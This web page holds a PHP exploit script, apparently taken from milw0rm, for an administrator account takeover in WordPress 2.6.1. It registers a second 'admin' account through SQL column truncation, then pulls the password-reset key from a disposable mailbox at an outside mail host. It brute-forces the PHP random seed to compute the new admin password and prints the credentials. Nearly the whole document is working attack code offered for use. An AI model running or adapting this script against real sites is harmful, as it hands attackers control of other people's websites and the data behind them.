<html><head><title>Wordpress 2.6.1 (SQL Column Truncation) Admin Takeover Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
# ------------------------------------------------------------
# quick'n'dirty wordpress admin-take0ver poc
# by iso^kpsbr in august 2oo8 
#
# works w/ wordpress 2.6.1
#
#         .oO( private -- do not spread! )Oo.
#
# you'll have to make sure you run roughly the same
# php version as on the server, that is: if server
# is &gt;=5.2.1 you'll need to be as well, in case
# server is &lt;5.2.1, your php also needs to be below.
# to make sure it works you'll need the exact same version!
# also, mod_php works better than (f)cgi..
# (this is a first working version - not a very reliable one)
#
# you should create rainbow tables to make this work in a
# real world scenario:
# php-5.2.0/php createtables.php &gt; wp261_php520
# php-5.2.1/php createtables.php &gt; wp261_php521
#
#-------------------------------------------------------------

	$BLOG = $_SERVER['argv'][1];

	echo &quot;[+] w0rdpress 2.6.1. admin takeover, iso 0808\n&quot;;

	if(!$BLOG) {
		echo &quot;[!] Usage: &quot;.$_SERVER['argv'][0].&quot; blogurl\n&quot;;
		echo &quot;    fe: &quot;.$_SERVER['argv'][0].&quot; http://31337.biz/blog\n&quot;;
		exit;
	}

	$UA = &quot;WordpressAdminTakeover&quot;;
	$MBOX=&quot;wp&quot;.`ps|md5sum|head -c 8`;
	$EMAIL=&quot;$MBOX@nospamfor.us&quot;;

	echo (file_exists('wp261_php520') &amp;&amp; file_exists('wp261_php521')) ?
			&quot;[X] rainbow tables available\n&quot; :
			&quot;[!] rainbow tables not found - this will be really slow\n&quot;;

	set_time_limit(0);
	ini_set(&quot;max_execution_time&quot;,0);
	ini_set(&quot;default_socket_timeout&quot;,20);

	if(!preg_match('!http://([^/]+)(.*)$!', $BLOG, $match)) {
		die(&quot;[!] $BLOG is no valid URL\n&quot;);
	}

	$HOST = $match[1];
	$PATH = $match[2];
	if(!$PATH) $PATH='/';

	echo &quot;[-] registering new admin user\n&quot;;
	$suck = fsockopen($HOST, 80) or die(&quot;[!] could not connect to $HOST:80\n&quot;);
	$data = &quot;user_login=admin&quot;.str_repeat(&quot;%20&quot;,60).&quot;x&amp;user_email=$EMAIL&quot;;
	$req = &quot;POST $PATH/wp-login.php?action=register HTTP/1.1\r\nHost: $HOST\r\nUser-Agent: $UA\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;.$data;
	fputs($suck, $req);
	sleep(1);
	fclose($suck);

	echo &quot;[-] requesting resetlink and mail to '$EMAIL'\n&quot;;
	$suck = fsockopen($HOST, 80) or die(&quot;[!] could not connect to $HOST:80\n&quot;);
	$data=&quot;user_login=$EMAIL&amp;wp-submit=Get+New+Password&quot;;	
	$req = &quot;POST $PATH/wp-login.php?action=lostpassword HTTP/1.1\r\nHost: $HOST\r\nReferer: $BLOG/wp-login.php?action=lostpassword\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;.$data.&quot;\r\n&quot;;
	fputs($suck, $req);

	echo &quot;[.] giving $BLOG some time to deliver mail..\n&quot;;
	for($i=0;$i&lt;8;$i++) {
		fputs($suck,&quot;GET / HTTP/1.1\r\nHost: $HOST\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\n\r\n&quot;);
		sleep(2);
	}

	echo &quot;[-] fetching resetlink token $MBOX\n&quot;;
	$PAGE = file_get_contents(&quot;http://www.nospamfor.us/mailbox.php?mailbox=$MBOX&amp;sitename=nospamfor.us&quot;);
	if(!preg_match('/.+mailid=(\d+).+?Reset/s', $PAGE, $match)) die(&quot;[!] failed to find resetmail try raising the wait-time right above\n&quot;);
	$MAILID=$match[1];

	echo &quot;[-] fetching resetmail $MAILID\n&quot;;

	$WHOLEMAIL=file_get_contents(&quot;http://www.nospamfor.us/mail.php?mailid=$MAILID&amp;sitename=nospamfor.us&amp;mailbox=$MBOX&quot;);
	if(!preg_match('/key=([A-z0-9]+)/', $WHOLEMAIL, $match)) die(&quot;[!] could not find resetkey in $WHOLEMAIL\n&quot;);
	$KEY=$match[1];

	echo &quot;[X] found resetkey $KEY\n&quot;;
	echo &quot;[-] resetting password\n&quot;;

	$req = &quot;GET $PATH/wp-login.php?action=rp&amp;key=$KEY HTTP/1.1\r\nHost: $HOST\r\nUser-Agent:$UA\r\nConnection: close\r\n\r\n&quot;;
	fputs($suck, $req);
	while(!feof($suck)) {
		#echo &quot;D:&quot;.
		fgets($suck);
	}
	fclose($suck);

	echo &quot;[-] calculating password\n&quot;;
	$SEED=false;
	if(file_exists('wp261_php520')) {
		$SEED=`grep -F $KEY wp261*|cut -d : -f 1`;
		echo &quot;[X] got seed $SEED from rainbow table\n&quot;;
	}
	$PASSWORD=calcpass($KEY, $SEED);

	echo &quot;[X] all done.&quot;;
	exit;

	function calcpass($resetkey, $seed = false) {
		mt_srand(2); $a = mt_rand(); mt_srand(3); $b = mt_rand();
		define('BUGGY', $a == $b);
		echo &quot;[-] wpress password computation. runnig in &quot;.(BUGGY?'fast':'slow').&quot; mode\n&quot;;

		echo &quot;[+] got key $resetkey via mail\n&quot;;

		if(!$seed) $seed = getseed($resetkey);

		if($seed===false) die(&quot;[!] seed not found :( try using identical php version (&lt; 5.2.5)\n&quot;);

		mt_srand($seed);
		echo &quot;[-] seed for key &quot;.wp_generate_password(20,false).&quot; is $seed\n&quot;;
		$pass = wp_generate_password();
		echo &quot;[+] new credentials are admin:$pass\n&quot;;
		return $pass;
	}

	function wp_generate_password($length = 12, $special_chars = true) {
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		if ( $special_chars )
			$chars .= '!@#$%^&amp;*()';

		$password = '';
		for ( $i = 0; $i &lt; $length; $i++ )
			$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
		return $password;
	} 

	function getseed($resetkey) {
		echo &quot;[-] calculating rand seed for $resetkey (this will take a looong time)&quot;;
		$max = pow(2,(32-BUGGY));
		for($x=0;$x&lt;=$max;$x++) {
			$seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x;
			mt_srand($seed);
			$testkey = wp_generate_password(20,false);
			if($testkey==$resetkey) { echo &quot;o\n&quot;; return $seed; }

			if(!($x % 10000)) echo &quot;.&quot;;
		}
		echo &quot;\n&quot;;
		return false;
	}

?&gt;

# milw0rm.com [2008-09-10]</pre></html>